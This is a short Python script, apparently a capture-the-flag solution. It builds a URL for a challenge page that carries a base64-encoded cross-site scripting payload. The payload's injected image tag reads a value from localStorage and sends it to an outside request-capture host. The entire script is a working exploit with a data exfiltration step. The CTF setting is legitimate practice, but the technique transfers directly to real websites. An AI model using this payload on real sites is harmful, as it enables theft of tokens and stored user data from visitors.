from base64 import b16decode,b64encode
pay = b"""
import time

print("<img/src/onerror=\\"let x = localStorage.flag;new Image().src='http://4q6dalz4.requestrepo.com/?c='+x\\"/>")
"""
url = f"https://amateurs-ctf-2024-sculpture-challenge.pages.dev?code={b64encode(pay).decode('utf-8')}"
print(url)
